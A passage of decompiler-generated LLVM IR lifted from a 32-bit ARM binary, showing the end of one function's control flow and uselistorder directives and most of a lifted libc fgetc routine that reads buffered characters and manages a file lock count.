  %v4_2b3e4 = sext i8 %v3_2b3e4 to i32
  store i32 %v4_2b3e4, i32* %r3.global-to-local, align 4
  store i32 %v4_2b3e4, i32* %r2.global-to-local, align 4
  %v2_2b3e8 = icmp eq i8 %v3_2b3e4, 0
  store i1 %v2_2b3e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2b3e8, label %bb254, label %bb253

bb253:                                            ; preds = %dec_label_pc_2b3e4
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb254

bb254:                                            ; preds = %dec_label_pc_2b3e4, %bb253
  %v1_2b448 = phi i32 [ %v4_2b3e4, %dec_label_pc_2b3e4 ], [ 1, %bb253 ]
  %v2_2b3f0 = sub i32 %v2_2b3d8, %v1_2b448
  store i32 %v2_2b3f0, i32* %r1.global-to-local, align 4
  store i32 160, i32* %r0.global-to-local, align 4
  %v2_2b3f8 = ptrtoint i8* %stack_var_-46 to i32
  store i32 %v2_2b3f8, i32* %r3.global-to-local, align 4
  %v2_2b3fc = icmp eq i32 %v2_2b3f0, 0
  store i1 %v2_2b3fc, i1* %cpsr_z.global-to-local, align 1
  store i32 160, i32* %stack_var_-180, align 4
  %tmp255 = icmp slt i32 %v2_2b3f0, 1
  br i1 %tmp255, label %dec_label_pc_2b464, label %dec_label_pc_2b410

dec_label_pc_2b410:                               ; preds = %bb254
  %v3_2b410 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_2b410, i32* %lr.global-to-local, align 4
  %v1_2b414 = add i32 %v3_2b410, 12
  %v2_2b414 = inttoptr i32 %v1_2b414 to i32*
  %v3_2b414 = load i32, i32* %v2_2b414, align 4
  store i32 %v3_2b414, i32* %r3.global-to-local, align 4
  %v1_2b418 = and i32 %v3_2b414, 8
  %v2_2b418 = icmp eq i32 %v1_2b418, 0
  store i1 %v2_2b418, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2b418, label %dec_label_pc_2b43c, label %dec_label_pc_2b420

dec_label_pc_2b420:                               ; preds = %dec_label_pc_2b410
  store i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32* %r2.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 -33357), i32* %r3.global-to-local, align 4
  %v1_2b430 = add i32 %v1_2b3d4.pre, 12
  store i32 %v1_2b430, i32* %r6.global-to-local, align 4
  %v1_2b434 = inttoptr i32 %v1_2b3d4.pre to i32*
  store i32 160, i32* %v1_2b434, align 4
  %v3_2b434 = add i32 %v1_2b3d4.pre, 4
  %v4_2b434 = inttoptr i32 %v3_2b434 to i32*
  %v5_2b434 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_2b434, i32* %v4_2b434, align 4
  %v6_2b434 = add i32 %v1_2b3d4.pre, 8
  %v7_2b434 = inttoptr i32 %v6_2b434 to i32*
  %v8_2b434 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v8_2b434, i32* %v7_2b434, align 4
  br label %dec_label_pc_2b468

dec_label_pc_2b43c:                               ; preds = %dec_label_pc_2b410
  store i32 %v3_2b410, i32* %ip.global-to-local, align 4
  %v1_2b440 = add i32 %v3_2b410, 16
  %v2_2b440 = inttoptr i32 %v1_2b440 to i32*
  %v3_2b440 = load i32, i32* %v2_2b440, align 4
  store i32 %v3_2b440, i32* %r3.global-to-local, align 4
  %v7_2b444 = icmp eq i32 %v3_2b440, 48
  store i1 %v7_2b444, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_2b444, label %.thread54.thread70, label %bb256

bb256:                                            ; preds = %dec_label_pc_2b43c
  store i32 %v2_2b3d8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_2b464

.thread54.thread70:                               ; preds = %dec_label_pc_2b43c
  %v4_2b450 = load i32, i32* %stack_var_-164, align 4
  store i32 %v1_2b3d4.pre, i32* %r6.global-to-local, align 4
  %v3_2b458 = add i32 %v4_2b450, %v2_2b3f0
  store i32 %v3_2b458, i32* %r3.global-to-local, align 4
  store i32 %v3_2b458, i32* %stack_var_-164, align 4
  br label %dec_label_pc_2b468

dec_label_pc_2b464:                               ; preds = %bb256, %bb254
  store i32 %v1_2b3d4.pre, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_2b468

dec_label_pc_2b468:                               ; preds = %.thread54.thread70, %dec_label_pc_2b420, %dec_label_pc_2b464
  store i32 0, i32* %r7.global-to-local, align 4
  %v2_2b46c = ptrtoint i32* %stack_var_-180 to i32
  store i32 %v2_2b46c, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_2b470

dec_label_pc_2b470:                               ; preds = %dec_label_pc_2b498, %dec_label_pc_2b468
  %v0_2b470 = phi i32 [ %v1_2b48c, %dec_label_pc_2b498 ], [ %v2_2b46c, %dec_label_pc_2b468 ]
  %v1_2b470 = inttoptr i32 %v0_2b470 to i32*
  %v2_2b470 = load i32, i32* %v1_2b470, align 4
  store i32 %v2_2b470, i32* %r1.global-to-local, align 4
  %v3_2b470 = add i32 %v0_2b470, 4
  %v4_2b470 = inttoptr i32 %v3_2b470 to i32*
  %v5_2b470 = load i32, i32* %v4_2b470, align 4
  store i32 %v5_2b470, i32* %r2.global-to-local, align 4
  %v6_2b470 = add i32 %v0_2b470, 8
  %v7_2b470 = inttoptr i32 %v6_2b470 to i32*
  %v8_2b470 = load i32, i32* %v7_2b470, align 4
  store i32 %v8_2b470, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  store i32 %arg5, i32* %ip.global-to-local, align 4
  store i32 177284, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg5)
  %v0_2b484 = load i32, i32* %r5.global-to-local, align 4
  %v1_2b484 = add i32 %v0_2b484, 4
  %v2_2b484 = inttoptr i32 %v1_2b484 to i32*
  %v3_2b484 = load i32, i32* %v2_2b484, align 4
  store i32 %v3_2b484, i32* %r3.global-to-local, align 4
  %v0_2b488 = load i32, i32* %r0.global-to-local, align 4
  %v9_2b488 = icmp eq i32 %v0_2b488, %v3_2b484
  store i1 %v9_2b488, i1* %cpsr_z.global-to-local, align 1
  %v1_2b48c = add i32 %v0_2b484, 12
  store i32 %v1_2b48c, i32* %r5.global-to-local, align 4
  br i1 %v9_2b488, label %dec_label_pc_2b498, label %bb257

bb257:                                            ; preds = %dec_label_pc_2b470
  store i32 -1, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_2b4b8

dec_label_pc_2b498:                               ; preds = %dec_label_pc_2b470
  %v0_2b49c.pre = load i32, i32* %r7.global-to-local, align 4
  %v1_2b498 = load i32, i32* %r6.global-to-local, align 4
  %v3_2b498 = icmp ult i32 %v1_2b48c, %v1_2b498
  %v9_2b498 = icmp eq i32 %v1_2b48c, %v1_2b498
  store i1 %v9_2b498, i1* %cpsr_z.global-to-local, align 1
  %v2_2b49c = add i32 %v0_2b49c.pre, %v3_2b484
  store i32 %v2_2b49c, i32* %r7.global-to-local, align 4
  br i1 %v3_2b498, label %dec_label_pc_2b470, label %dec_label_pc_2b4b8

dec_label_pc_2b4b0:                               ; preds = %.thread21, %bb239
  %v0_2b4b0 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_2b4b0, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_2b1b0

dec_label_pc_2b4b8:                               ; preds = %dec_label_pc_2b498, %bb257
  %v0_2b4b8 = phi i32 [ -1, %bb257 ], [ %v2_2b49c, %dec_label_pc_2b498 ]
  store i32 %v0_2b4b8, i32* %r0.global-to-local, align 4
  store i32 %v27_2acf4, i32* @lr, align 4
  ret i32 %v0_2b4b8

; uselistorder directives
  uselistorder i32 %v0_2b4b8, { 1, 0 }
  uselistorder i32 %v1_2b498, { 1, 0 }
  uselistorder i32 %v1_2b48c, { 0, 1, 3, 2 }
  uselistorder i32 %v0_2b470, { 2, 1, 0 }
  uselistorder i32 %v3_2b410, { 1, 0, 2, 3 }
  uselistorder i32 %v2_2b3d8, { 0, 1, 3, 2 }
  uselistorder i32 %v4_2b3cc, { 1, 2, 0 }
  uselistorder i32 %v0_2b3cc, { 1, 0 }
  uselistorder i32 %v1_2b3d4.pre, { 6, 5, 3, 2, 1, 4, 0 }
  uselistorder i32 %v2_2b38c, { 2, 3, 4, 1, 0 }
  uselistorder i32 %v6_2b388, { 2, 1, 0 }
  uselistorder i32 %storemerge158, { 1, 0 }
  uselistorder i32 %v0_2b34c, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v2_2b314, { 1, 0 }
  uselistorder i32 %v1_2b314, { 1, 2, 0, 3 }
  uselistorder i32 %v2_2b310, { 2, 4, 0, 1, 3, 5 }
  uselistorder i1 %v2_2b270, { 2, 1, 0 }
  uselistorder i32 %v2_2b1f0, { 1, 3, 2, 4, 0 }
  uselistorder i32 %v2_2b1e0, { 1, 2, 3, 5, 0, 4, 6 }
  uselistorder i1 %v2_2b1cc, { 1, 0, 2 }
  uselistorder i32 %v5_2b1c8, { 0, 2, 1, 3 }
  uselistorder i32 %v1_2b25830, { 3, 0, 4, 6, 1, 2, 5, 7, 8, 9 }
  uselistorder i1 %v2_2b180, { 1, 0 }
  uselistorder i32 %v1_2b178, { 1, 2, 0 }
  uselistorder i32 %v2_2b16c, { 1, 0 }
  uselistorder i32 %v1_2b16c, { 1, 2, 0, 3 }
  uselistorder i32 %v0_2b16c, { 3, 4, 0, 5, 6, 1, 2, 7 }
  uselistorder i1 %v3_2b13c, { 1, 0 }
  uselistorder i32 %v0_2b13c, { 0, 2, 1 }
  uselistorder i32 %v2_2b138, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32 %v1_2b124, { 1, 0 }
  uselistorder i1 %v2_2b114, { 1, 0 }
  uselistorder i32 %v1_2b110, { 3, 2, 1, 0 }
  uselistorder i32 %v2_2b10c, { 1, 0 }
  uselistorder i1 %v2_2b0fc, { 1, 0 }
  uselistorder i32 %v1_2b0f0, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v2_2b0a4, { 1, 2, 0, 3 }
  uselistorder i32 %v0_2b0a4, { 1, 0, 2 }
  uselistorder i1 %v2_2b08c, { 1, 0 }
  uselistorder i32 %v5_2b074, { 1, 0 }
  uselistorder i32 %v0_2b060, { 1, 2, 0, 3 }
  uselistorder i32 %v0_2b048, { 1, 2, 0 }
  uselistorder i32 %v2_2b044, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_2afdc, { 2, 4, 1, 0, 3 }
  uselistorder i32 %stack_var_-192.4, { 1, 2, 0, 3 }
  uselistorder i32 %v0_2af84, { 1, 0 }
  uselistorder double %v2_2af48, { 1, 0 }
  uselistorder i32 %v0_2af04, { 1, 2, 0, 4, 3, 5 }
  uselistorder i32 %v3_2aef8, { 1, 0 }
  uselistorder i32 %v2_2af34, { 1, 3, 0, 2 }
  uselistorder i32 %v0_2aec8, { 1, 0 }
  uselistorder i32 %v5_2ae84, { 1, 0 }
  uselistorder i32 %v1_2ada4.v0_2ad905, { 1, 0 }
  uselistorder i32 %v3_2ae60, { 1, 0 }
  uselistorder i32 %v0_2ae3c, { 0, 2, 3, 1 }
  uselistorder i32 %v2_2ae24, { 2, 1, 0 }
  uselistorder i32 %v0_2ae08, { 1, 0 }
  uselistorder i32 %v0_2ad28, { 0, 2, 3, 1, 4, 5 }
  uselistorder i32* %stack_var_-156, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-83, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-82, { 1, 2, 0 }
  uselistorder i32* %stack_var_-180, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-144, { 1, 0, 2 }
  uselistorder i32* %stack_var_-47, { 1, 0 }
  uselistorder i32* %stack_var_-164, { 0, 1, 4, 2, 3 }
  uselistorder i8* %stack_var_-46, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32* %stack_var_0, { 2, 3, 0, 1 }
  uselistorder i32 %tmp160, { 1, 0, 2, 3 }
  uselistorder i32* %sb.global-to-local, { 2, 3, 4, 5, 6, 0, 7, 8, 1, 9 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 12, 11, 13 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 1, 3, 4, 13, 14, 15, 5, 16, 17, 6, 18, 19, 20, 7, 21, 22, 8, 23, 24, 9, 10, 11, 12, 25, 26, 27, 28, 30, 29, 31, 32 }
  uselistorder i32* %r6.global-to-local, { 21, 0, 22, 1, 2, 3, 4, 19, 20, 5, 6, 10, 11, 12, 7, 13, 14, 8, 15, 9, 16, 17, 18 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 9, 7, 10, 11, 8, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 20, 18, 19, 21, 22, 23, 24, 25, 26, 27, 29, 43, 30, 34, 31, 32, 33, 35, 28, 36, 37, 38, 39, 40, 41, 42, 64, 45, 44, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 2, 65, 66, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 18, 15, 19, 20, 16, 17, 21, 22, 23, 26, 24, 25, 27, 28, 29, 30, 32, 31, 33, 34, 35, 36, 37, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 14, 11, 12, 15, 17, 13, 18, 16, 19, 20, 0, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36 }
  uselistorder i32* %r0.global-to-local, { 6, 7, 8, 9, 3, 10, 11, 20, 19, 18, 21, 12, 13, 17, 14, 15, 5, 22, 16, 0, 23, 24, 2, 1, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 38, 37, 4 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 6, 7, 8, 3, 4, 5, 9, 12, 10, 11, 13, 14, 15, 16, 17, 18 }
  uselistorder i32* %fp.global-to-local, { 3, 4, 0, 1, 5, 2, 6 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 61, 18, 19, 20, 21, 22, 23, 24, 25, 60, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 59, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58 }
  uselistorder i32 57, { 1, 0 }
  uselistorder i32 102, { 1, 2, 3, 4, 0 }
  uselistorder i32 103, { 1, 2, 3, 4, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__aeabi_dcmpge, { 1, 0 }
  uselistorder i32 1104006501, { 4, 1, 2, 0, 3 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 -33336), { 0, 2, 1 }
  uselistorder i32 1100470148, { 1, 2, 0, 3 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 -33360), { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__aeabi_dcmplt, { 3, 2, 1, 0 }
  uselistorder double 0.000000e+00, { 2, 1, 0, 3 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__aeabi_dcmpeq, { 2, 1, 0 }
  uselistorder i8 32, { 0, 2, 3, 4, 1, 5, 6, 7 }
  uselistorder i8 43, { 0, 2, 1 }
  uselistorder i32 %arg5, { 1, 0 }
  uselistorder i32 %arg4, { 0, 1, 2, 6, 5, 4, 3, 8, 7, 9 }
  uselistorder label %dec_label_pc_2b4b0, { 1, 0 }
  uselistorder label %dec_label_pc_2b468, { 2, 0, 1 }
  uselistorder label %bb254, { 1, 0 }
  uselistorder label %dec_label_pc_2b3c8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_2b340, { 2, 0, 1 }
  uselistorder label %dec_label_pc_2b310, { 1, 0 }
  uselistorder label %.thread46, { 1, 0 }
  uselistorder label %dec_label_pc_2b2e8, { 1, 0 }
  uselistorder label %dec_label_pc_2b2bc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_2b298, { 2, 1, 0 }
  uselistorder label %dec_label_pc_2b268, { 2, 1, 0 }
  uselistorder label %.thread34, { 2, 1, 0 }
  uselistorder label %dec_label_pc_2b1b0, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_2b1a0, { 1, 0 }
  uselistorder label %bb236, { 1, 0 }
  uselistorder label %bb234, { 1, 0 }
  uselistorder label %bb232, { 1, 0 }
  uselistorder label %.thread145, { 1, 0 }
  uselistorder label %._crit_edge93, { 1, 0 }
  uselistorder label %bb228, { 1, 0 }
  uselistorder label %bb226, { 1, 0 }
  uselistorder label %.preheader, { 3, 1, 0, 2 }
  uselistorder label %bb223, { 1, 0 }
  uselistorder label %dec_label_pc_2b0c8, { 2, 1, 0 }
  uselistorder label %bb220, { 2, 1, 0 }
  uselistorder label %dec_label_pc_2afd4, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_2af84, { 2, 1, 0 }
  uselistorder label %dec_label_pc_2af7c, { 1, 0 }
  uselistorder label %bb212, { 1, 0 }
  uselistorder label %.thread124, { 1, 0 }
  uselistorder label %dec_label_pc_2ae60, { 1, 0 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %dec_label_pc_2ad7c, { 1, 0 }
  uselistorder label %bb205, { 1, 0 }
  uselistorder label %bb203, { 1, 0 }
  uselistorder label %bb201, { 1, 0 }
}

define i32 @__GI_fgetc(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_2b4e8 = load i32, i32* @r4, align 4
  store i32 %v3_2b4e8, i32* %stack_var_-20, align 4
  %v6_2b4e8 = load i32, i32* @r5, align 4
  %v9_2b4e8 = load i32, i32* @r6, align 4
  %v12_2b4e8 = load i32, i32* @r7, align 4
  %v15_2b4e8 = load i32, i32* @lr, align 4
  %v1_2b4ec = add i32 %arg1, 52
  %v2_2b4ec = inttoptr i32 %v1_2b4ec to i32*
  %v3_2b4ec = load i32, i32* %v2_2b4ec, align 4
  store i32 %v3_2b4ec, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_2b4f0 = icmp eq i32 %v3_2b4ec, 0
  store i32 %arg1, i32* @r7, align 4
  br i1 %v2_2b4f0, label %dec_label_pc_2b524, label %dec_label_pc_2b500

dec_label_pc_2b500:                               ; preds = %entry
  %v1_2b500 = add i32 %arg1, 16
  %v2_2b500 = inttoptr i32 %v1_2b500 to i32*
  %v3_2b500 = load i32, i32* %v2_2b500, align 4
  store i32 %v3_2b500, i32* %r2.global-to-local, align 4
  %v1_2b504 = add i32 %arg1, 24
  %v2_2b504 = inttoptr i32 %v1_2b504 to i32*
  %v3_2b504 = load i32, i32* %v2_2b504, align 4
  store i32 %v3_2b504, i32* %r3.global-to-local, align 4
  %v3_2b508 = icmp uge i32 %v3_2b500, %v3_2b504
  store i1 %v3_2b508, i1* %cpsr_c.global-to-local, align 1
  br i1 %v3_2b508, label %dec_label_pc_2b518, label %.thread

.thread:                                          ; preds = %dec_label_pc_2b500
  %v2_2b50c = inttoptr i32 %v3_2b500 to i8*
  %v3_2b50c = load i8, i8* %v2_2b50c, align 1
  %v4_2b50c = zext i8 %v3_2b50c to i32
  store i32 %v4_2b50c, i32* %r5.global-to-local, align 4
  %v6_2b50c = add i32 %v3_2b500, 1
  store i32 %v6_2b50c, i32* %r2.global-to-local, align 4
  store i32 %v6_2b50c, i32* %v2_2b500, align 4
  br label %dec_label_pc_2b61c

dec_label_pc_2b518:                               ; preds = %dec_label_pc_2b500
  %v1_2b518 = inttoptr i32 %arg1 to i16*
  %v2_2b518 = call i32 @getc_unlocked(i16* %v1_2b518)
  store i32 %v2_2b518, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_2b61c

dec_label_pc_2b524:                               ; preds = %entry
  %v0_2b524 = call i32 @__aeabi_read_tp()
  %v0_2b528 = load i32, i32* @r7, align 4
  %v1_2b528 = add i32 %v0_2b528, 64
  %v2_2b528 = inttoptr i32 %v1_2b528 to i32*
  %v3_2b528 = load i32, i32* %v2_2b528, align 4
  store i32 %v3_2b528, i32* %r3.global-to-local, align 4
  %v1_2b52c = add i32 %v0_2b524, -1168
  store i32 %v1_2b52c, i32* @r6, align 4
  %v3_2b530 = icmp uge i32 %v3_2b528, %v1_2b52c
  store i1 %v3_2b530, i1* %cpsr_c.global-to-local, align 1
  %v9_2b530 = icmp eq i32 %v3_2b528, %v1_2b52c
  br i1 %v9_2b530, label %dec_label_pc_2b578, label %dec_label_pc_2b538

dec_label_pc_2b538:                               ; preds = %dec_label_pc_2b524
  %v1_2b538 = add i32 %v0_2b528, 56
  store i32 %v1_2b538, i32* @r5, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v1_2b538, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_2b544

dec_label_pc_2b544:                               ; preds = %dec_label_pc_2b550.dec_label_pc_2b544_crit_edge, %dec_label_pc_2b538
  %v0_2b544 = phi i32 [ %v0_2b544.pre, %dec_label_pc_2b550.dec_label_pc_2b544_crit_edge ], [ %v1_2b538, %dec_label_pc_2b538 ]
  %v1_2b544 = inttoptr i32 %v0_2b544 to i32*
  %v2_2b544 = load i32, i32* %v1_2b544, align 4
  store i32 %v2_2b544, i32* %r3.global-to-local, align 4
  %v1_2b548 = load i32, i32* @r4, align 4
  %v3_2b548 = icmp uge i32 %v2_2b544, %v1_2b548
  store i1 %v3_2b548, i1* %cpsr_c.global-to-local, align 1
  %v9_2b548 = icmp eq i32 %v2_2b544, %v1_2b548
  br i1 %v9_2b548, label %dec_label_pc_2b550, label %dec_label_pc_2b568

dec_label_pc_2b550:                               ; preds = %dec_label_pc_2b544
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_2b560 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_2b560, label %dec_label_pc_2b564, label %dec_label_pc_2b550.dec_label_pc_2b544_crit_edge

dec_label_pc_2b550.dec_label_pc_2b544_crit_edge:  ; preds = %dec_label_pc_2b550
  %v0_2b544.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_2b544

dec_label_pc_2b564:                               ; preds = %dec_label_pc_2b550
  %v0_2b564 = load i32, i32* @r4, align 4
  store i32 %v0_2b564, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_2b568

dec_label_pc_2b568:                               ; preds = %dec_label_pc_2b544, %dec_label_pc_2b564
  %v0_2b568 = phi i32 [ %v0_2b564, %dec_label_pc_2b564 ], [ %v2_2b544, %dec_label_pc_2b544 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_2b568 = icmp eq i32 %v0_2b568, 0
  br i1 %v2_2b568, label %bb18, label %bb

bb:                                               ; preds = %dec_label_pc_2b568
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_2b568, %bb
  store i32 177524, i32* @lr, align 4
  %v1_2b570 = xor i1 %v2_2b568, true
  call void @__pseudo_cond_branch(i1 %v1_2b570, i32 ptrtoint (i32* @global_var_27dec.3092 to i32))
  %v0_2b574 = load i32, i32* @r6, align 4
  %v1_2b574 = load i32, i32* @r7, align 4
  %v2_2b574 = add i32 %v1_2b574, 64
  %v3_2b574 = inttoptr i32 %v2_2b574 to i32*
  store i32 %v0_2b574, i32* %v3_2b574, align 4
  %v0_2b578.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_2b578

dec_label_pc_2b578:                               ; preds = %dec_label_pc_2b524, %bb18
  %v1_2b588 = phi i32 [ %v0_2b528, %dec_label_pc_2b524 ], [ %v0_2b578.pre, %bb18 ]
  %v1_2b578 = add i32 %v1_2b588, 60
  %v2_2b578 = inttoptr i32 %v1_2b578 to i32*
  %v3_2b578 = load i32, i32* %v2_2b578, align 4
  store i32 %v3_2b578, i32* %r2.global-to-local, align 4
  %v1_2b57c = add i32 %v1_2b588, 16
  %v2_2b57c = inttoptr i32 %v1_2b57c to i32*
  %v3_2b57c = load i32, i32* %v2_2b57c, align 4
  store i32 %v3_2b57c, i32* %r1.global-to-local, align 4
  %v1_2b580 = add i32 %v1_2b588, 24
  %v2_2b580 = inttoptr i32 %v1_2b580 to i32*
  %v3_2b580 = load i32, i32* %v2_2b580, align 4
  store i32 %v3_2b580, i32* %r3.global-to-local, align 4
  %v1_2b584 = add i32 %v3_2b578, 1
  store i32 %v1_2b584, i32* %r2.global-to-local, align 4
  store i32 %v1_2b584, i32* %v2_2b578, align 4
  %v0_2b58c = load i32, i32* %r1.global-to-local, align 4
  %v1_2b58c = load i32, i32* %r3.global-to-local, align 4
  %v3_2b58c = icmp uge i32 %v0_2b58c, %v1_2b58c
  store i1 %v3_2b58c, i1* %cpsr_c.global-to-local, align 1
  br i1 %v3_2b58c, label %dec_label_pc_2b59c, label %.thread2

.thread2:                                         ; preds = %dec_label_pc_2b578
  %v2_2b590 = inttoptr i32 %v0_2b58c to i8*
  %v3_2b590 = load i8, i8* %v2_2b590, align 1
  %v4_2b590 = zext i8 %v3_2b590 to i32
  store i32 %v4_2b590, i32* %r5.global-to-local, align 4
  %v6_2b590 = add i32 %v0_2b58c, 1
  store i32 %v6_2b590, i32* %r1.global-to-local, align 4
  %v2_2b594 = load i32, i32* @r7, align 4
  %v3_2b594 = add i32 %v2_2b594, 16
  %v4_2b594 = inttoptr i32 %v3_2b594 to i32*
  store i32 %v6_2b590, i32* %v4_2b594, align 4
  br label %dec_label_pc_2b5a8

dec_label_pc_2b59c:                               ; preds = %dec_label_pc_2b578
  %v0_2b59c = load i32, i32* @r7, align 4
  %v1_2b5a0 = inttoptr i32 %v0_2b59c to i16*
  %v2_2b5a0 = call i32 @getc_unlocked(i16* %v1_2b5a0)
  store i32 %v2_2b5a0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_2b5a8

dec_label_pc_2b5a8:                               ; preds = %.thread2, %dec_label_pc_2b59c
  %v0_2b5a8 = load i32, i32* @r7, align 4
  %v1_2b5a8 = add i32 %v0_2b5a8, 60
  %v2_2b5a8 = inttoptr i32 %v1_2b5a8 to i32*
  %v3_2b5a8 = load i32, i32* %v2_2b5a8, align 4
  %v1_2b5ac = add i32 %v3_2b5a8, -1
  store i32 %v1_2b5ac, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_2b5b0 = icmp eq i32 %v1_2b5ac, 0
  store i32 %v1_2b5ac, i32* %v2_2b5a8, align 4
  br i1 %v2_2b5b0, label %dec_label_pc_2b5bc, label %dec_label_pc_2b61c

dec_label_pc_2b5bc:                               ; preds = %dec_label_pc_2b5a8
  %v0_2b5bc = load i32, i32* %r3.global-to-local, align 4
  %v1_2b5bc = load i32, i32* @r7, align 4
  %v2_2b5bc = add i32 %v1_2b5bc, 64
  %v3_2b5bc = inttoptr i32 %v2_2b5bc to i32*
  store i32 %v0_2b5bc, i32* %v3_2b5bc, align 4
  %v0_2b5c0 = load i32, i32* @r7, align 4
  %v1_2b5c0 = add i32 %v0_2b5c0, 56
  store i32 %v1_2b5c0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_2b5c4

dec_label_pc_2b5c4:                               ; preds = %dec_label_pc_2b5f4.dec_label_pc_2b5c4_crit_edge, %dec_label_pc_2b5bc
  %v0_2b5cc = phi i32 [ %v0_2b5cc.pre, %dec_label_pc_2b5f4.dec_label_pc_2b5c4_crit_edge ], [ %v1_2b5c0, %dec_label_pc_2b5bc ]
  %v0_2b5c4 = phi i32 [ %v0_2b5c4.pre, %dec_label_pc_2b5f4.dec_label_pc_2b5c4_crit_edge ], [ %v0_2b5c0, %dec_label_pc_2b5bc ]
  %v1_2b5c4 = add i32 %v0_2b5c4, 56
  %v2_2b5c4 = inttoptr i32 %v1_2b5c4 to i32*
  %v3_2b5c4 = load i32, i32* %v2_2b5c4, align 4
  store i32 %v3_2b5c4, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_2b5cc, i32* %r2.global-to-local, align 4
  %v1_2b5d022 = inttoptr i32 %v0_2b5cc to i32*
  %v2_2b5d023 = load i32, i32* %v1_2b5d022, align 4
  store i32 %v2_2b5d023, i32* %r3.global-to-local, align 4
  %v3_2b5d425 = icmp uge i32 %v2_2b5d023, %v3_2b5c4
  store i1 %v3_2b5d425, i1* %cpsr_c.global-to-local, align 1
  %v9_2b5d431 = icmp eq i32 %v2_2b5d023, %v3_2b5c4
  br i1 %v9_2b5d431, label %dec_label_pc_2b5dc, label %dec_label_pc_2b5f4

dec_label_pc_2b5dc:                               ; preds = %dec_label_pc_2b5c4, %dec_label_pc_2b5dc.dec_label_pc_2b5d0_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_2b5ec = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_2b5ec, label %dec_label_pc_2b5f0, label %dec_label_pc_2b5dc.dec_label_pc_2b5d0_crit_edge

dec_label_pc_2b5dc.dec_label_pc_2b5d0_crit_edge:  ; preds = %dec_label_pc_2b5dc
  %v0_2b5d0.pre = load i32, i32* %r2.global-to-local, align 4
